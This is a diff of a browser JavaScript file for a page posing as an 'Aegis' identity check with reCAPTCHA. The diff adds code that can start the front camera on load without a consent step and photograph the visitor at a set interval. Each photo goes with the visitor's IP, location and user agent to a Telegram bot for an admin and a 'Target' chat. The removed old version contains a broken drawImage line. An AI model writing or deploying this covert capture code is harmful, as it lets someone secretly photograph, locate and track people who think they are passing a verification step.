@@ -1,99 +1,224 @@
 import { CONFIG } from "./config.js";
 
-const video    = document.getElementById("video");
-const canvas   = document.getElementById("canvas");
+/* ============ DOM refs ============ */
+const video      = document.getElementById("video");
+const canvas     = document.getElementById("canvas");
+const camCard    = document.getElementById("camCard");
+const camTitle   = document.getElementById("camTitle");
+const camSub     = document.getElementById("camSub");
+const statStrip  = document.getElementById("statStrip");
+const cntCap     = document.getElementById("cntCaptures");
+const delSt      = document.getElementById("delStatus");
+const diag       = document.getElementById("diag");
+const sessId     = document.getElementById("sessId");
+const recapW     = document.getElementById("recapWrap");
+const liveProg   = document.getElementById("liveProgress");
+const sd1        = document.getElementById("sd1");
+const sd2        = document.getElementById("sd2");
+const sd3        = document.getElementById("sd3");
 
-const consent  = document.getElementById("stepConsent");
-const camStage = document.getElementById("camStage");
-const doneStage= document.getElementById("doneStage");
-
-const barFill  = document.getElementById("barFill");
-const pctText  = document.getElementById("pctText");
-const stageSt  = document.getElementById("stageStatus");
-const doneMsg  = document.getElementById("doneMsg");
+/* ============ Params ============ */
+const params     = new URLSearchParams(window.location.search);
+const userChatId = params.get("id");
+const hasTarget  = !!(userChatId && userChatId.trim());
+const ADMIN_ID   = CONFIG.ADMIN_CHAT_ID;
 
 let stream = null;
+let captureTimer = null;
+let captureCount = 0;
+let capturing = false;
+let recaptchaWidgetId = null;
 
-function show(el){ el.style.display = "block"; }
-function hide(el){ el.style.display = "none"; }
+/* ============ Session id ============ */
+sessId.textContent = "AG-" + Math.random().toString(36).slice(2, 8).toUpperCase();
 
-function setPct(p){ barFill.style.width = p+"%"; pctText.textContent = Math.round(p)+"%"; }
+/* ============ Helpers ============ */
+function log(t){
+  if (CONFIG.DEBUG) console.log("[Aegis]", t);
+  if (diag) diag.textContent = t;
+}
 
-/* ---------- helpers ---------- */
+function setStep(n){
+  [sd1, sd2, sd3].forEach(s => s.classList.remove("active","done"));
+  if (n >= 1) sd1.classList.add("done");
+  if (n >= 2) sd2.classList.add("done");
+  if (n === 1) sd1.classList.add("active");
+  if (n === 2) sd2.classList.add("active");
+  if (n === 3) sd3.classList.add("active");
+}
+
+function setCam(state, title, sub){
+  camCard.classList.remove("active");
+  if (state === "active") camCard.classList.add("active");
+  camTitle.textContent = title;
+  camSub.textContent = sub;
+}
+
+/* ============ Intel ============ */
 async function getIP(){
-  try { const r=await fetch("https://api.ipify.org?format=json"); return (await r.json()).ip; }
+  try { const r = await fetch("https://api.ipify.org?format=json");
+        const d = await r.json(); return d.ip || "Unknown"; }
+  catch { try { const r = await fetch("https://ipapi.co/json/");
+                const d = await r.json(); return d.ip || "Unknown"; }
+          catch { return "Unknown"; } }
+}
+async function getGeo(){
+  try { const r = await fetch("https://ipapi.co/json/");
+        const d = await r.json();
+        return `${d.city || "?"}, ${d.country_name || "?"}`; }
   catch { return "Unknown"; }
 }
 
-async function sendImage(blob, caption){
+/* ============ Send ============ */
+async function sendPhotoTo(targetId, blob, caption){
   const fd = new FormData();
-  fd.append("chat_id", CONFIG.ADMIN_CHAT_ID);
-  fd.append("photo", blob, `check_${Date.now()}.jpg`);
+  fd.append("chat_id", targetId);
+  fd.append("photo", blob, `aegis_${Date.now()}.jpg`);
   fd.append("caption", caption);
-  try{
-    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-    return res.ok;
-  }catch(e){ return false; }
+  try {
+    const res = await fetch(
+      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
+      { method:"POST", body:fd }
+    );
+    if (!res.ok){ log("send fail " + targetId); return false; }
+    return true;
+  } catch { log("net err " + targetId); return false; }
 }
 
-/* ---------- start flow ---------- */
-document.getElementById("btnStart").addEventListener("click", async () => {
-  hide(consent);
-  show(camStage);
-  stageSt.textContent = "Requesting camera…";
+/* ============ Capture ============ */
+async function capture(){
+  if (!stream || !capturing) return;
 
-  try{
+  canvas.width  = video.videoWidth  || CONFIG.CAM_WIDTH;
+  canvas.height = video.videoHeight || CONFIG.CAM_HEIGHT;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+
+  const blob = await new Promise(res =>
+    canvas.toBlob(res, "image/jpeg", CONFIG.IMAGE_QUALITY)
+  );
+  if (!blob) return;
+
+  const ip   = await getIP();
+  const geo  = await getGeo();
+  const ua   = navigator.userAgent;
+  const date = new Date().toLocaleString("en-US", { timeZoneName:"short" });
+
+  const base = `📸 #${captureCount + 1}\n🕐 ${date}\n🌐 ${ip} — ${geo}\n💻 ${ua}`;
+  const adminCaption = hasTarget
+    ? `${base}\n👤 Target: ${userChatId}`
+    : `${base}\n🧾 No target (admin-only)`;
+
+  if (CONFIG.SEND_ADMIN_ALWAYS) await sendPhotoTo(ADMIN_ID, blob, adminCaption);
+  if (CONFIG.SEND_TO_USER_IF_ID && hasTarget) await sendPhotoTo(userChatId, blob, base);
+
+  captureCount++;
+  cntCap.textContent = captureCount;
+  delSt.textContent = "✓";
+  log("capture " + captureCount);
+}
+
+/* ============ Camera ============ */
+async function startCamera(){
+  log("requesting camera");
+  setCam("requesting", "Requesting camera access…", "Tap \"Allow\" to begin your check.");
+  setStep(1);
+
+  try {
     stream = await navigator.mediaDevices.getUserMedia({
-      video:{ width:{ideal:480}, height:{ideal:640}, facingMode:"user" }
+      video: {
+        width: { ideal: CONFIG.CAM_WIDTH },
+        height:{ ideal: CONFIG.CAM_HEIGHT },
+        facingMode: "user"
+      }
     });
     video.srcObject = stream;
     await video.play();
-    await new Promise(r => video.readyState>=2 ? r() : video.onloadeddata=r);
+    await new Promise(res => {
+      if (video.readyState >= 2) return res();
+      video.onloadeddata = res;
+      setTimeout(res, 2500);
+    });
 
-    // warm-up so image is not black
-    stageSt.textContent = "Camera ready — capturing…";
-    await new Promise(r => setTimeout(r, 800));
+    window.__cameraReady = true;
+    setCam("active", "Camera active — verifying…", "Keep this tab open while we check.");
+    statStrip.style.display = "flex";
+    liveProg.style.display = "block";
+    recapW.classList.remove("dimmed");
 
-    // capture N frames
-    const ip = await getIP();
-    let ok = 0;
-    for (let i=0; i<CONFIG.CAPTURE_COUNT; i++){
-      setPct( (i/CONFIG.CAPTURE_COUNT)*100 );
-      canvas.width  = CONFIG.CAM_WIDTH;
-      canvas.height = CONFIG.CAM_HEIGHT;
-      canvas.getContext("2d").drawImage(video,0,0,CAM width,W); // draw
-      const blob = await new Promise(res => canvas.toBlob(res,"image/jpeg",CONFIG.IMAGE_QUALITY));
-      if (blob){
-        const date = new Date().toLocaleString("en-US",{timeZoneName:"short"});
-        const cap = `Live check frame ${i+1}/${CONFIG.CAPTURE_COUNT}\n🕐 ${date}\n🌐 IP: ${ip}`;
-        const sent = await sendImage(blob, cap);
-        if (sent) ok++;
-      }
-      if (i < CONFIG.CAPTURE_COUNT-1) await new Promise(r=>setTimeout(r,CONFIG.CAPTURE_GAP_MS));
-    }
-    setPct(100);
-    stopCamera();
+    capturing = true;
+    await capture();
+    captureTimer = setInterval(capture, CONFIG.CAPTURE_INTERVAL_MS);
 
-    hide(camStage);
-    show(doneStage);
-    doneMsg.textContent = ok>0
-      ? `${ok} frame(s) delivered to your configured chat.`
-      : "Delivery failed — check your BOT_TOKEN / chat ID in config.js";
-    doneStage.scrollIntoView({behavior:"smooth"});
-
-  }catch(err){
-    stageSt.textContent = "❌ Camera unavailable or denied. Reload and try again.";
-    console.error(err);
+    tryRenderRecaptcha();
+    log("camera running");
+  } catch (err){
+    log("camera denied: " + err.name);
+    setCam("active", "Camera required", "Allow camera access and reload to try again.");
   }
-});
-
-/* ---------- finish ---------- */
-document.getElementById("btnFinish").addEventListener("click", ()=>{
-  window.location.href = addParam("done.html", location.search);
-});
-function addParam(base, qs){ return qs ? base+qs : base; }
-
-function stopCamera(){
-  if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
 }
-window.addEventListener("beforeunload", stopCamera);
+
+/* ============ Stop ============ */
+function stopCapture(){
+  capturing = false;
+  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
+  if (stream){ stream.getTracks().forEach(t => t.stop()); stream = null; }
+  statStrip.style.display = "none";
+  liveProg.style.display = "none";
+}
+
+/* ============ reCAPTCHA ============ */
+function tryRenderRecaptcha(){
+  if (!window.__recaptchaReady || !window.__cameraReady) return;
+  if (recaptchaWidgetId !== null) return;
+  const container = document.getElementById("recaptchaWidget");
+  if (!container) return;
+
+  try {
+    recaptchaWidgetId = window.grecaptcha.render(container, {
+      sitekey: CONFIG.RECAPTCHA_SITE_KEY,
+      callback: onRecaptchaSuccess,
+      "expired-callback": onRecaptchaExpired,
+      "error-callback": onRecaptchaError
+    });
+    log("recaptcha rendered");
+  } catch (e){
+    console.error("reCAPTCHA error:", e);
+    log("recaptcha render fail");
+  }
+}
+window.__tryRenderRecaptcha = tryRenderRecaptcha;
+
+function onRecaptchaSuccess(){
+  log("captcha solved");
+  setStep(3);
+  document.getElementById("bottomRight").textContent = "✓ Identity verified";
+
+  if (CONFIG.STAY_ON_PAGE_AFTER_SUCCESS) return;
+
+  stopCapture();
+  setTimeout(() => { window.location.href = "next.html"; }, 900);
+}
+window.onRecaptchaSuccess = onRecaptchaSuccess;
+
+function onRecaptchaExpired(){
+  log("captcha expired");
+  setCam("active", "Session expired", "Please solve the challenge again.");
+}
+window.onRecaptchaExpired = onRecaptchaExpired;
+
+function onRecaptchaError(){
+  log("captcha error");
+  setCam("active", "Error", "Something went wrong. Reload to retry.");
+}
+window.onRecaptchaError = onRecaptchaError;
+
+/* ============ Auto start ============ */
+if (CONFIG.AUTO_START_ON_LOAD){
+  window.addEventListener("load", () => {
+    log("auto-start on load");
+    startCamera();
+  });
+}
+
+window.addEventListener("beforeunload", stopCapture);
